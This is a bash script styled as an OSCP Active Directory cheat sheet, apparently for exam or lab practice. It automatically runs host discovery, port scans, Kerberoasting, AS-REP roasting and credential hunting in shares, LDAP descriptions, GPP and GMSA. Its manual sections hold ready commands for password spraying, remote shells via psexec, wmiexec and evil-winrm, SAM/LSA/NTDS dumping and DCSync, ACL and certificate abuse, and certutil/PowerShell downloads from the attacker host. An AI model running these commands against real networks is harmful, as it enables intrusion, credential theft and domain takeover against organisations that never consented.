#!/bin/bash
# ============================================================
#  OSCP AD Cheat Sheet — You Have a User
#  Usage: Fill in the variables, then run: bash oscp-ad-user.sh
#  It will auto-run recon checks and save output to ./ad_loot/
#  Copy/paste the manual sections as needed after that.
# ============================================================

# -------------------- VARIABLES --------------------
DC_IP="<DC_IP>"
DOMAIN="<DOMAIN.LOCAL>"
USER="<username>"
PASS="<password>"
HASH="<NTLM_HASH>"          # if you have one (aad3b435...:<hash>)
TARGET="<TARGET_IP>"         # current target host
LHOST="<YOUR_IP>"
LPORT="443"
SUBNET="<10.10.10>"          # first 3 octets for scans

# -------------------- OUTPUT DIR --------------------
LOOT="./ad_loot"
mkdir -p "$LOOT"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() { echo -e "\n${CYAN}[*]==================== $1 ====================[*]${NC}\n"; }
success() { echo -e "${GREEN}[+] $1${NC}"; }
warn() { echo -e "${YELLOW}[!] $1${NC}"; }
fail() { echo -e "${RED}[-] $1${NC}"; }

# ============================================================
#  AUTO-RUN: PORT SCAN — COMMON AD SERVICES
# ============================================================
banner "PORT SCAN — COMMON AD SERVICES"

# Discover live hosts first
echo -e "${CYAN}[*] Sweeping $SUBNET.0/24 for live hosts...${NC}"
for ip in $(seq 1 254); do
    (ping -c 1 -W 1 ${SUBNET}.${ip} &>/dev/null && echo "${SUBNET}.${ip}") &
done 2>/dev/null | sort -t. -k4 -n | tee "$LOOT/live_hosts.txt"
wait
LIVE_COUNT=$(wc -l < "$LOOT/live_hosts.txt" 2>/dev/null || echo 0)
success "Found $LIVE_COUNT live host(s) → $LOOT/live_hosts.txt"

# Scan common AD/service ports on all live hosts
AD_PORTS="21,22,25,53,80,88,111,135,139,389,443,445,464,593,636,1433,1521,2049,3268,3269,3306,3389,5432,5985,5986,8080,8443,9389"

echo -e "\n${CYAN}[*] Scanning common service ports on live hosts...${NC}"
if command -v nmap &>/dev/null; then
    nmap -Pn -sT --open -T4 -p $AD_PORTS -iL "$LOOT/live_hosts.txt" -oN "$LOOT/port_scan.txt" -oG "$LOOT/port_scan.gnmap" 2>/dev/null
    success "Port scan complete → $LOOT/port_scan.txt"

    # Parse open ports per host
    echo ""
    echo -e "${CYAN}--- Open Ports Summary ---${NC}"
    grep "open" "$LOOT/port_scan.gnmap" 2>/dev/null | while read -r line; do
        host=$(echo "$line" | awk '{print $2}')
        ports=$(echo "$line" | grep -oP '\d+/open' | tr '\n' ',' | sed 's/,$//')
        echo -e "  ${GREEN}$host${NC} → $ports"
    done
    echo ""

    # Flag interesting services
    grep -q "88/open"   "$LOOT/port_scan.gnmap" 2>/dev/null && success "Kerberos (88) found — DC candidate"
    grep -q "5985/open" "$LOOT/port_scan.gnmap" 2>/dev/null && success "WinRM (5985) found — evil-winrm target"
    grep -q "1433/open" "$LOOT/port_scan.gnmap" 2>/dev/null && warn "MSSQL (1433) found — check for xp_cmdshell"
    grep -q "3389/open" "$LOOT/port_scan.gnmap" 2>/dev/null && success "RDP (3389) found"
    grep -q "3306/open" "$LOOT/port_scan.gnmap" 2>/dev/null && warn "MySQL (3306) found"
    grep -q "2049/open" "$LOOT/port_scan.gnmap" 2>/dev/null && warn "NFS (2049) found — check showmount"
    grep -q "21/open"   "$LOOT/port_scan.gnmap" 2>/dev/null && warn "FTP (21) found — check anonymous login"
else
    fail "nmap not found — falling back to bash connect scan on DC only"
    for port in 21 22 53 80 88 135 139 389 443 445 464 636 1433 3268 3389 5985 5986 8080; do
        (echo >/dev/tcp/$DC_IP/$port) 2>/dev/null && success "DC $DC_IP:$port OPEN"
    done
fi

# ============================================================
#  AUTO-RUN: KERBEROASTING
# ============================================================
banner "KERBEROASTING"

echo -e "${CYAN}[*] Requesting TGS tickets for all SPN accounts...${NC}"
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -request -outputfile "$LOOT/kerberoast.txt" 2>&1 | tee "$LOOT/kerberoast_output.txt"

if [ -s "$LOOT/kerberoast.txt" ]; then
    KERB_COUNT=$(grep -c '$krb5tgs$' "$LOOT/kerberoast.txt" 2>/dev/null || echo 0)
    success "Got $KERB_COUNT Kerberoast hash(es) → $LOOT/kerberoast.txt"
    echo -e "${YELLOW}[!] Crack with: hashcat -m 13100 $LOOT/kerberoast.txt /usr/share/wordlists/rockyou.txt${NC}"

    # Show which accounts have SPNs
    echo -e "\n${CYAN}--- Kerberoastable Accounts ---${NC}"
    grep -v "^$\|Impacket\|ServicePrincipalName\|^-" "$LOOT/kerberoast_output.txt" 2>/dev/null | head -20
else
    warn "No Kerberoastable accounts found"
fi

# ============================================================
#  AUTO-RUN: AS-REP ROASTING
# ============================================================
banner "AS-REP ROASTING"

echo -e "${CYAN}[*] Checking for accounts with Kerberos pre-auth disabled...${NC}"
impacket-GetNPUsers "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -request -outputfile "$LOOT/asrep.txt" 2>&1 | tee "$LOOT/asrep_output.txt"

if [ -s "$LOOT/asrep.txt" ]; then
    ASREP_COUNT=$(grep -c '$krb5asrep$' "$LOOT/asrep.txt" 2>/dev/null || echo 0)
    success "Got $ASREP_COUNT AS-REP hash(es) → $LOOT/asrep.txt"
    echo -e "${YELLOW}[!] Crack with: hashcat -m 18200 $LOOT/asrep.txt /usr/share/wordlists/rockyou.txt${NC}"
else
    warn "No AS-REP roastable accounts found"
fi

# ============================================================
#  AUTO-RUN: QUICK ENUM CHECKS
# ============================================================
banner "QUICK ENUM CHECKS"

# SMB shares
echo -e "${CYAN}[*] Enumerating SMB shares...${NC}"
netexec smb $DC_IP -u "$USER" -p "$PASS" --shares 2>/dev/null | tee "$LOOT/shares.txt"

# Password policy
echo -e "\n${CYAN}[*] Pulling password/lockout policy...${NC}"
netexec smb $DC_IP -u "$USER" -p "$PASS" --pass-pol 2>/dev/null | tee "$LOOT/passpol.txt"

# GPP passwords
echo -e "\n${CYAN}[*] Checking for GPP passwords...${NC}"
netexec smb $DC_IP -u "$USER" -p "$PASS" -M gpp_password 2>/dev/null | tee "$LOOT/gpp.txt"

# User descriptions (password hunting)
echo -e "\n${CYAN}[*] Checking user descriptions for passwords...${NC}"
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" \
  "(&(objectClass=user)(description=*))" sAMAccountName description 2>/dev/null | \
  grep -E "sAMAccountName:|description:" | tee "$LOOT/user_descriptions.txt"

# GMSA passwords
echo -e "\n${CYAN}[*] Checking for readable GMSA passwords...${NC}"
netexec ldap $DC_IP -u "$USER" -p "$PASS" --gmsa 2>/dev/null | tee "$LOOT/gmsa.txt"

# ============================================================
#  AUTO-RUN SUMMARY
# ============================================================
banner "AUTO-RUN COMPLETE"
echo -e "${GREEN}All output saved to: $LOOT/${NC}"
echo ""
ls -la "$LOOT/"
echo ""
echo -e "${CYAN}Next steps:${NC}"
echo "  1. Check $LOOT/kerberoast.txt and $LOOT/asrep.txt — crack any hashes"
echo "  2. Review $LOOT/shares.txt — spider interesting shares"
echo "  3. Review $LOOT/user_descriptions.txt — look for embedded passwords"
echo "  4. Run BloodHound (Section 4 below) for attack paths"
echo "  5. Use the manual sections below for lateral movement and exploitation"
echo ""

# ############################################################
#  MANUAL SECTIONS — COPY/PASTE AS NEEDED
# ############################################################

exit 0  # <-- Remove this line to see the manual reference below
        #     or just scroll/search the file for what you need.

# ============================================================
#  M1. DNS ENUMERATION
# ============================================================

# --- DNS zone transfer attempt ---
dig axfr $DOMAIN @$DC_IP

# --- Reverse lookup sweep (adjust range) ---
# for ip in $(seq 1 254); do nslookup ${SUBNET}.$ip $DC_IP 2>/dev/null | grep "name ="; done

# ============================================================
#  M2. DEEPER SMB ENUMERATION
# ============================================================

# --- List shares with smbclient ---
smbclient -L //$DC_IP -U "$USER%$PASS"

# --- Spider readable shares for loot ---
netexec smb $DC_IP -u "$USER" -p "$PASS" -M spider_plus

# --- Connect to a specific share ---
# smbclient //$DC_IP/<SHARE> -U "$USER%$PASS"

# --- Null session check ---
netexec smb $DC_IP -u '' -p '' --shares

# ============================================================
#  M3. USER & GROUP ENUMERATION
# ============================================================

# --- Domain users ---
netexec smb $DC_IP -u "$USER" -p "$PASS" --users

# --- Domain groups ---
netexec smb $DC_IP -u "$USER" -p "$PASS" --groups

# --- RID brute ---
netexec smb $DC_IP -u "$USER" -p "$PASS" --rid-brute

# --- rpcclient ---
rpcclient -U "$USER%$PASS" $DC_IP -c "enumdomusers"
rpcclient -U "$USER%$PASS" $DC_IP -c "enumdomgroups"
# rpcclient -U "$USER%$PASS" $DC_IP -c "queryuser <RID>"
# rpcclient -U "$USER%$PASS" $DC_IP -c "querygroupmem <GROUP_RID>"

# ============================================================
#  M4. LDAP ENUMERATION
# ============================================================

# --- Full LDAP dump ---
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" > "$LOOT/ldap_dump.txt"

# --- Kerberoastable users (LDAP view) ---
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# --- AS-REP roastable users (LDAP view) ---
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# --- Computers ---
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=${DOMAIN%%.*},DC=${DOMAIN##*.}" \
  "(objectClass=computer)" dNSHostName operatingSystem

# ============================================================
#  M5. BLOODHOUND COLLECTION
# ============================================================

bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns $DC_IP -c All

# Alternative:
# netexec smb $DC_IP -u "$USER" -p "$PASS" -M bloodhound -o COLLMETHOD=All

# ============================================================
#  M6. PASSWORD SPRAYING
# ============================================================

# --- Policy already pulled in auto-run (check $LOOT/passpol.txt) ---

# --- Spray ---
# netexec smb $DC_IP -u users.txt -p 'Welcome1!' --continue-on-success

# --- Spray with Kerbrute (faster, no lockout on preauth) ---
# kerbrute passwordspray -d $DOMAIN --dc $DC_IP users.txt 'Welcome1!'

# ============================================================
#  M7. LATERAL MOVEMENT — CHECK ACCESS
# ============================================================

# --- Check which hosts the user can access ---
netexec smb "$LOOT/live_hosts.txt" -u "$USER" -p "$PASS"
netexec winrm "$LOOT/live_hosts.txt" -u "$USER" -p "$PASS"
netexec smb "$LOOT/live_hosts.txt" -u "$USER" -p "$PASS" -x "whoami"

# --- With NTLM hash ---
netexec smb "$LOOT/live_hosts.txt" -u "$USER" -H "$HASH"
netexec winrm "$LOOT/live_hosts.txt" -u "$USER" -H "$HASH"

# ============================================================
#  M8. SHELL ACCESS
# ============================================================

# --- WinRM (port 5985) ---
evil-winrm -i $TARGET -u "$USER" -p "$PASS"
# evil-winrm -i $TARGET -u "$USER" -H "$HASH"

# --- PSExec (requires admin + writable share) ---
impacket-psexec "$DOMAIN/$USER:$PASS"@$TARGET
# impacket-psexec "$DOMAIN/$USER"@$TARGET -hashes "$HASH"

# --- WMIExec (stealthier) ---
impacket-wmiexec "$DOMAIN/$USER:$PASS"@$TARGET
# impacket-wmiexec "$DOMAIN/$USER"@$TARGET -hashes "$HASH"

# --- SMBExec ---
impacket-smbexec "$DOMAIN/$USER:$PASS"@$TARGET

# --- Atexec (task scheduler) ---
impacket-atexec "$DOMAIN/$USER:$PASS"@$TARGET "whoami"

# ============================================================
#  M9. POST-EXPLOITATION — DUMP CREDS
# ============================================================

# --- SAM ---
netexec smb $TARGET -u "$USER" -p "$PASS" --sam
impacket-secretsdump "$DOMAIN/$USER:$PASS"@$TARGET

# --- LSA ---
netexec smb $TARGET -u "$USER" -p "$PASS" --lsa

# --- DCSync (need DA or replication rights) ---
impacket-secretsdump "$DOMAIN/$USER:$PASS"@$DC_IP -just-dc
# Single user:
# impacket-secretsdump "$DOMAIN/$USER:$PASS"@$DC_IP -just-dc-user Administrator

# --- NTDS.dit ---
netexec smb $DC_IP -u "$USER" -p "$PASS" --ntds

# ============================================================
# M10. PRIVILEGE ESCALATION PATHS
# ============================================================

# --- Targeted Kerberoast (GenericWrite on a user → set SPN → roast) ---
# python3 targetedKerberoast.py -d $DOMAIN -u "$USER" -p "$PASS" --dc-ip $DC_IP

# --- Force password change (ForceChangePassword ACL) ---
# rpcclient -U "$USER%$PASS" $DC_IP -c "setuserinfo2 <target_user> 23 'NewP@ss123!'"

# --- Add user to group (WriteMember ACL) ---
# net rpc group addmem "<GROUP>" "$USER" -U "$DOMAIN/$USER%$PASS" -S $DC_IP

# --- Shadow Credentials (GenericWrite on computer) ---
# certipy shadow auto -u "$USER@$DOMAIN" -p "$PASS" -account '<TARGET_COMPUTER$>'

# --- ADCS / Certipy (certificate abuse) ---
# certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -vulnerable
# certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca '<CA_NAME>' -template '<TEMPLATE>' -dc-ip $DC_IP

# ============================================================
# M11. FILE TRANSFER HELPERS
# ============================================================

# --- HTTP server from Kali ---
# python3 -m http.server 80

# --- From Windows target ---
# certutil -urlcache -split -f http://$LHOST/file.exe C:\Temp\file.exe
# iwr -uri http://$LHOST/file.exe -outfile C:\Temp\file.exe
# (New-Object Net.WebClient).DownloadFile("http://$LHOST/file.exe","C:\Temp\file.exe")

# --- SMB share ---
# impacket-smbserver share $(pwd) -smb2support
# On Windows: copy \\$LHOST\share\file.exe C:\Temp\

# ============================================================
# M12. MSSQL (if port 1433 is open)
# ============================================================

# --- Connect ---
# impacket-mssqlclient "$DOMAIN/$USER:$PASS"@$TARGET -windows-auth

# --- Enable xp_cmdshell (once connected) ---
# EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
# EXEC xp_cmdshell 'whoami';

# --- netexec MSSQL check ---
# netexec mssql $TARGET -u "$USER" -p "$PASS" -q "SELECT name FROM master.dbo.sysdatabases"

# ============================================================
# M13. QUICK WINS CHECKLIST
# ============================================================
# [ ] Check $LOOT/user_descriptions.txt for passwords
# [ ] Check share spider output for creds/configs
# [ ] Crack $LOOT/kerberoast.txt hashes
# [ ] Crack $LOOT/asrep.txt hashes
# [ ] Password spray with found passwords
# [ ] Check BloodHound for short paths to DA
# [ ] Check $LOOT/gmsa.txt for readable GMSA passwords
# [ ] Check $LOOT/gpp.txt for GPP passwords
# [ ] Check for writable scripts in SYSVOL/NETLOGON
# [ ] Dump creds from any host you have admin on
# [ ] Certipy — check for ESC1-ESC8 certificate abuse
# [ ] If MSSQL open — check xp_cmdshell
# [ ] If NFS open — showmount -e $TARGET
# [ ] If FTP open — check anonymous login
